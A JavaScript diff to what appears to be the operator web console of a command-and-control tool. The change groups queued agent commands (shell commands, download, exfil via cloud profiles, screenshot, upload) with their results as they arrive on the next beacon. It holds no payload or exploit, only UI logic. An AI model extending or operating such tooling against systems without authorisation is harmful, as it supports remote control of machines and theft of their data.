@@ -26,6 +26,9 @@ const state = {
   sessionDownloads: [],
   /** Commands echoed locally; skip duplicate operator lines from server. */
   echoedCommands: new Set(),
+  /** Pending command blocks for queued result placement (tech plan §6). */
+  pendingCommandBlocks: [],
+  commandBlockSeq: 0,
   /** Per-session command history for ↑/↓ and Tab (session id → string[]). */
   shellHistoryBySession: {},
   /** ↑/↓ navigation: index into history (-1 = draft at end). */
@@ -330,6 +333,7 @@ async function selectHistorySession(id) {
   state.selectedId = null;
   state.lastEventId = 0;
   state.echoedCommands.clear();
+  state.pendingCommandBlocks = [];
   stopEventPolling();
   renderSessionList();
   renderHistoryList();
@@ -525,6 +529,262 @@ function scrollShellToBottom() {
   log.scrollTop = log.scrollHeight;
 }
 
+function scrollShellIfNearBottom() {
+  const log = shellOutputEl();
+  const threshold = 80;
+  const nearBottom = log.scrollHeight - log.scrollTop - log.clientHeight < threshold;
+  if (nearBottom) scrollShellToBottom();
+}
+
+function normalizeCmdKey(cmd) {
+  return String(cmd || "").trim().replace(/\s+/g, " ");
+}
+
+function operatorActionKind(body) {
+  const b = String(body || "").trim();
+  const idx = b.indexOf(":");
+  if (idx === -1) return null;
+  return b.slice(0, idx).trim().toLowerCase();
+}
+
+function commandKeysMatch(blockKey, evCmd) {
+  const a = normalizeCmdKey(blockKey);
+  const b = normalizeCmdKey(evCmd);
+  if (!a || !b) return false;
+  if (a === b) return true;
+  if (a.startsWith("exfil ") && b.startsWith("exfil ")) {
+    const remote = a.slice(6).split(" ")[0];
+    if (remote && b.includes(remote)) return true;
+  }
+  if (a.startsWith("download ") && b.startsWith("download ")) {
+    const remote = a.slice(9).trim();
+    if (remote && b.includes(remote)) return true;
+  }
+  return false;
+}
+
+function findPendingCommandBlock(ev) {
+  const evType = ev.type || "output";
+  const evCmd = normalizeCmdKey(ev.command);
+  const pending = state.pendingCommandBlocks.filter((b) => !b.filled);
+
+  if (evCmd) {
+    for (const block of pending) {
+      if (block.matchKeys.some((k) => commandKeysMatch(k, evCmd))) {
+        return block;
+      }
+    }
+    if (evType === "output") {
+      for (const block of pending) {
+        if (block.kind === "upload" && block.remotePath) {
+          if (evCmd.includes(block.remotePath) || evCmd.includes("__UPLOAD__")) {
+            return block;
+          }
+        }
+      }
+    }
+  }
+
+  const typeKinds = {
+    file_upload: "download",
+    screenshot: "screenshot",
+    cloud_upload: "exfil",
+  };
+  const kind = typeKinds[evType];
+  if (kind) {
+    const body = String(ev.body || "");
+    for (const block of pending) {
+      if (block.kind !== kind) continue;
+      if (kind === "download" && block.remotePath) {
+        if (body.startsWith(block.remotePath) || body.includes(block.remotePath)) {
+          return block;
+        }
+        continue;
+      }
+      if (kind === "exfil" && block.remotePath) {
+        if (body.startsWith(block.remotePath) || body.includes(block.remotePath)) {
+          return block;
+        }
+        continue;
+      }
+      return block;
+    }
+  }
+
+  return null;
+}
+
+function renderEventResultHtml(ev) {
+  const evType = ev.type || "output";
+  const body = String(ev.body || "").trim();
+  if (evType === "screenshot" || evType === "file_upload" || ev.artifact_url) {
+    return renderEventBodyHtml(ev);
+  }
+  if (evType === "output") {
+    if (!body) return escapeHtml("(no output)");
+    return body
+      .split("\n")
+      .map((line) => escapeHtml(line))
+      .join("<br>");
+  }
+  if (body) return escapeHtml(body);
+  return escapeHtml(`(${evType})`);
+}
+
+function fillCommandBlock(block, ev) {
+  if (!block || block.filled) return false;
+  block.filled = true;
+  if (block.metaLine) {
+    block.metaLine.remove();
+    block.metaLine = null;
+  }
+  const evType = ev.type || "output";
+  const resultEl = block.resultEl;
+  if (evType === "screenshot" || evType === "file_upload" || ev.artifact_url) {
+    const line = document.createElement("div");
+    line.className = "shell-line shell-line-output";
+    line.innerHTML = renderEventResultHtml(ev);
+    resultEl.appendChild(line);
+  } else if (evType === "output") {
+    const text = String(ev.body || "");
+    if (!text) {
+      const line = document.createElement("div");
+      line.className = "shell-line shell-line-meta";
+      line.textContent = "(no output)";
+      resultEl.appendChild(line);
+    } else {
+      for (const lineText of text.split("\n")) {
+        const line = document.createElement("div");
+        line.className = "shell-line shell-line-output";
+        line.innerHTML = escapeHtml(lineText);
+        resultEl.appendChild(line);
+      }
+    }
+  } else {
+    const line = document.createElement("div");
+    line.className = "shell-line shell-line-output";
+    line.innerHTML = renderEventResultHtml(ev);
+    resultEl.appendChild(line);
+  }
+  scrollShellIfNearBottom();
+  return true;
+}
+
+function createCommandBlock(cmd, { meta = null, kind = null, remotePath = null, matchKeys = null } = {}) {
+  const log = shellOutputEl();
+  const blockEl = document.createElement("div");
+  blockEl.className = "shell-command-block";
+
+  const echoLine = document.createElement("div");
+  echoLine.className = "shell-line shell-line-echo";
+  echoLine.innerHTML = `<span class="prompt-char">${escapeHtml($("#shell-prompt").textContent)}</span> ${escapeHtml(cmd)}`;
+  blockEl.appendChild(echoLine);
+
+  let metaLine = null;
+  if (meta) {
+    metaLine = document.createElement("div");
+    metaLine.className = "shell-line shell-line-meta";
+    metaLine.innerHTML = escapeHtml(meta);
+    blockEl.appendChild(metaLine);
+  }
+
+  const resultEl = document.createElement("div");
+  resultEl.className = "shell-command-result";
+  blockEl.appendChild(resultEl);
+
+  log.appendChild(blockEl);
+  scrollShellIfNearBottom();
+
+  const keys = matchKeys ? matchKeys.map(normalizeCmdKey) : [normalizeCmdKey(cmd)];
+  const block = {
+    id: ++state.commandBlockSeq,
+    cmd,
+    kind,
+    remotePath: remotePath || null,
+    matchKeys: keys,
+    blockEl,
+    metaLine,
+    resultEl,
+    filled: false,
+  };
+  state.pendingCommandBlocks.push(block);
+  return block;
+}
+
+function appendUnmatchedEvent(ev) {
+  const evType = ev.type || "output";
+  const body = String(ev.body || "").trim();
+  const cmdEcho = (ev.command || "").trim();
+
+  if (evType === "output") {
+    if (cmdEcho) {
+      appendShellLine(
+        "meta",
+        escapeHtml(`result » ${cmdEcho}`)
+      );
+    }
+    appendShellOutput(body);
+    return;
+  }
+
+  if (evType === "config_ack") {
+    appendShellMeta(body ? `Config applied: ${body}` : "Config applied on agent");
+    return;
+  }
+
+  if (evType === "error" || evType === "queued") {
+    appendShellMeta(body || evType);
+    return;
+  }
+
+  if (evType === "screenshot" || evType === "file_upload" || ev.artifact_url) {
+    const block = document.createElement("div");
+    block.className = "shell-line shell-line-output";
+    block.innerHTML = renderEventBodyHtml(ev);
+    shellOutputEl().appendChild(block);
+    scrollShellIfNearBottom();
+    return;
+  }
+
+  appendShellLine(
+    "operator",
+    `[${ev.id}] ${escapeHtml(evType)}${cmdEcho ? ` » ${escapeHtml(cmdEcho)}` : ""}`
+  );
+  if (body) appendShellOutput(body);
+}
+
+function historyOperatorMeta(body) {
+  const action = operatorActionKind(body);
+  if (body.startsWith("queued:")) return "(queued)";
+  if (action === "download") return "(download queued)";
+  if (action === "exfil") return "(exfil queued)";
+  if (action === "upload") return "(upload queued)";
+  if (action === "screenshot") return "(screenshot queued)";
+  if (action === "config") return null;
+  return null;
+}
+
+function historyOperatorKind(body) {
+  const action = operatorActionKind(body);
+  const map = {
+    download: "download",
+    exfil: "exfil",
+    upload: "upload",
+    screenshot: "screenshot",
+  };
+  return map[action] || null;
+}
+
+function historyRemoteFromOperatorCmd(opCmd, kind) {
+  if (kind === "download" && opCmd.startsWith("download ")) {
+    return opCmd.slice(9).trim();
+  }
+  if (kind === "exfil" && opCmd.startsWith("exfil ")) {
+    return opCmd.slice(6).split(" ")[0];
+  }
+  return null;
+}
+
 function appendShellLine(kind, html) {
   const log = shellOutputEl();
   const line = document.createElement("div");
@@ -535,14 +795,18 @@ function appendShellLine(kind, html) {
   return line;
 }
 
-function appendShellEcho(cmd) {
+function appendShellEcho(cmd, { block = false, meta = null, kind = null, remotePath = null, matchKeys = null } = {}) {
   state.echoedCommands.add(cmd);
   setTimeout(() => state.echoedCommands.delete(cmd), 120000);
   rememberShellCommand(cmd);
+  if (block) {
+    return createCommandBlock(cmd, { meta, kind, remotePath, matchKeys });
+  }
   appendShellLine(
     "echo",
     `<span class="prompt-char">${escapeHtml($("#shell-prompt").textContent)}</span> ${escapeHtml(cmd)}`
   );
+  return null;
 }
 
 // --- Shell history & Tab completion (tech plan §4) ---
@@ -970,6 +1234,7 @@ async function selectSession(id) {
   state.selectedId = id;
   state.lastEventId = 0;
   state.echoedCommands.clear();
+  state.pendingCommandBlocks = [];
   renderSessionList();
   const s = state.sessions.find((x) => x.id === id);
   if (!s) return;
@@ -1061,19 +1326,16 @@ function appendEvent(ev, { local = false, history = false } = {}) {
   if (evType === "operator") {
     const opCmd = operatorCommandFromBody(body);
     if (history && opCmd) {
-      appendShellLine(
-        "echo",
-        `<span class="prompt-char">${escapeHtml($("#shell-prompt").textContent)}</span> ${escapeHtml(opCmd)}`
-      );
-      if (body.startsWith("queued:")) {
-        appendShellMeta("(queued)");
-      }
+      const kind = historyOperatorKind(body);
+      const meta = historyOperatorMeta(body);
+      const remotePath = historyRemoteFromOperatorCmd(opCmd, kind);
+      const matchKeys = [opCmd];
+      if (kind === "download") matchKeys.push(`download ${remotePath}`);
+      if (kind === "exfil") matchKeys.push(`exfil ${remotePath}`);
+      createCommandBlock(opCmd, { meta, kind, remotePath, matchKeys });
       return;
     }
     if (!history && opCmd && state.echoedCommands.has(opCmd)) {
-      if (body.startsWith("queued:")) {
-        appendShellMeta("(queued — waiting for next beacon)");
-      }
       return;
     }
     const label = body || "operator action";
@@ -1081,38 +1343,22 @@ function appendEvent(ev, { local = false, history = false } = {}) {
     return;
   }
 
-  if (evType === "output") {
-    const text = body || "";
-    if (cmdEcho && !history) {
-      /* result already follows echoed prompt */
+  const resultTypes = new Set([
+    "output",
+    "file_upload",
+    "cloud_upload",
+    "screenshot",
+  ]);
+  if (resultTypes.has(evType)) {
+    const block = findPendingCommandBlock(ev);
+    if (block && fillCommandBlock(block, ev)) {
+      return;
     }
-    appendShellOutput(text);
+    appendUnmatchedEvent(ev);
     return;
   }
 
-  if (evType === "config_ack") {
-    appendShellMeta(body ? `Config applied: ${body}` : "Config applied on agent");
-    return;
-  }
-
-  if (evType === "error" || evType === "queued") {
-    appendShellMeta(body || evType);
-    return;
-  }
-
-  if (evType === "screenshot" || evType === "file_upload" || ev.artifact_url) {
-    const block = document.createElement("div");
-    block.className = "shell-line shell-line-output";
-    block.innerHTML = renderEventBodyHtml(ev);
-    shellOutputEl().appendChild(block);
-    scrollShellToBottom();
-    return;
-  }
-
-  appendShellLine("operator", `[${ev.id}] ${escapeHtml(evType)}${cmdEcho ? ` » ${escapeHtml(cmdEcho)}` : ""}`);
-  if (body) {
-    appendShellOutput(body);
-  }
+  appendUnmatchedEvent(ev);
 }
 
 function clearShellInput() {
@@ -1132,7 +1378,10 @@ async function runCommand(wait) {
   if (!cmd || !state.selectedId) return;
 
   clearShellInput();
-  appendShellEcho(cmd);
+  appendShellEcho(cmd, {
+    block: !wait,
+    meta: wait ? null : "(queued — waiting for next beacon)",
+  });
   input.disabled = true;
 
   try {
@@ -1164,7 +1413,6 @@ async function runCommand(wait) {
         }
       );
       if (status === 200) {
-        appendShellMeta("(queued — waiting for next beacon)");
         pollSessionEvents().catch(() => {});
       } else {
         appendShellError(data.error || `HTTP ${status}`);
@@ -1180,7 +1428,13 @@ async function runCommand(wait) {
 async function queueDownload() {
   const remote = $("#download-remote").value.trim();
   if (!remote || !state.selectedId) return;
-  appendShellEcho(`download ${remote}`);
+  appendShellEcho(`download ${remote}`, {
+    block: true,
+    kind: "download",
+    remotePath: remote,
+    meta: "(download queued)",
+    matchKeys: [`download ${remote}`, `__DOWNLOAD__ ${remote}`],
+  });
   $("#download-remote").value = "";
   const { status, data } = await api(
     `/sessions/${encodeURIComponent(state.selectedId)}/download`,
@@ -1192,8 +1446,6 @@ async function queueDownload() {
   );
   if (status !== 200) {
     appendShellError(data.error || `HTTP ${status}`);
-  } else {
-    appendShellMeta("(download queued)");
   }
 }
 
@@ -1291,7 +1543,13 @@ async function queueExfil() {
   const profileSelect = $("#exfil-profile");
   const profile = profileSelect && !profileSelect.disabled ? profileSelect.value.trim() : "";
   if (!remote || !state.selectedId || !profile) return;
-  appendShellEcho(`exfil ${remote} ${profile}`);
+  appendShellEcho(`exfil ${remote} ${profile}`, {
+    block: true,
+    kind: "exfil",
+    remotePath: remote,
+    meta: `(exfil queued via ${profile})`,
+    matchKeys: [`exfil ${remote} ${profile}`, `exfil ${remote}`, `exfil ${remote} --profile ${profile}`],
+  });
   $("#exfil-remote").value = "";
   const { status, data } = await api(
     `/sessions/${encodeURIComponent(state.selectedId)}/exfil`,
@@ -1303,22 +1561,23 @@ async function queueExfil() {
   );
   if (status !== 200) {
     appendShellError(data.error || `HTTP ${status}`);
-  } else {
-    appendShellMeta(`(exfil queued via ${profile})`);
   }
 }
 
 async function queueScreenshot() {
   if (!state.selectedId) return;
-  appendShellEcho("screenshot");
+  appendShellEcho("screenshot", {
+    block: true,
+    kind: "screenshot",
+    meta: "(screenshot queued)",
+    matchKeys: ["screenshot", "__SCREENSHOT__"],
+  });
   const { status, data } = await api(
     `/sessions/${encodeURIComponent(state.selectedId)}/screenshot`,
     { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" }
   );
   if (status !== 200) {
     appendShellError(data.error || `HTTP ${status}`);
-  } else {
-    appendShellMeta("(screenshot queued)");
   }
 }
 
@@ -1328,7 +1587,13 @@ async function queueUpload() {
   if (!state.selectedId || !fileInput.files?.length || !remote) return;
 
   const file = fileInput.files[0];
-  appendShellEcho(`upload ${file.name} → ${remote}`);
+  appendShellEcho(`upload ${file.name} → ${remote}`, {
+    block: true,
+    kind: "upload",
+    remotePath: remote,
+    meta: "(upload queued)",
+    matchKeys: [`upload ${file.name} → ${remote}`, `__UPLOAD__ ${remote}`],
+  });
   const buf = await file.arrayBuffer();
   const bytes = new Uint8Array(buf);
   let binary = "";
@@ -1349,8 +1614,6 @@ async function queueUpload() {
   $("#upload-remote").value = "";
   if (status !== 200) {
     appendShellError(data.error || `HTTP ${status}`);
-  } else {
-    appendShellMeta("(upload queued)");
   }
 }
 
